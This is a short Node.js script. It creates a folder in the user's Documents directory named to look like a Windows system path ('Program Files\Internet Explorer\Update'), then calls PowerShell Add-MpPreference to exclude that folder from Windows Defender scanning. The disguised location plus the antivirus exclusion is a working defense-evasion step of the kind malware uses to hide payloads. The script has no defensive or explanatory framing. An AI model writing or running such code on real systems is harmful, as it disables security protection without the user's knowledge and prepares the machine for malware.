const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const os = require('os');

// Get current user's home directory
const homeDir = os.homedir();

// Build the directory path dynamically
const dirPath = path.join(homeDir, 'Documents', 'scripts', 'Program Files', 'Internet Explorer', 'Update');

// Create directory if it doesn't exist
try {
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
        console.log(`Directory created: ${dirPath}`);
    } else {
        console.log(`Directory already exists: ${dirPath}`);
    }
} catch (err) {
    console.error(`Failed to create directory: ${err.message}`);
}

// Add Defender exclusion (requires admin)
const exclusionPath = dirPath;
const psCommand = `Add-MpPreference -ExclusionPath '${exclusionPath}'`;

exec(`powershell -Command "${psCommand}"`, (error, stdout, stderr) => {
    if (error) {
        console.error(`Error adding exclusion: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`PowerShell error: ${stderr}`);
        return;
    }
    console.log(`Exclusion added: ${exclusionPath}`);
});
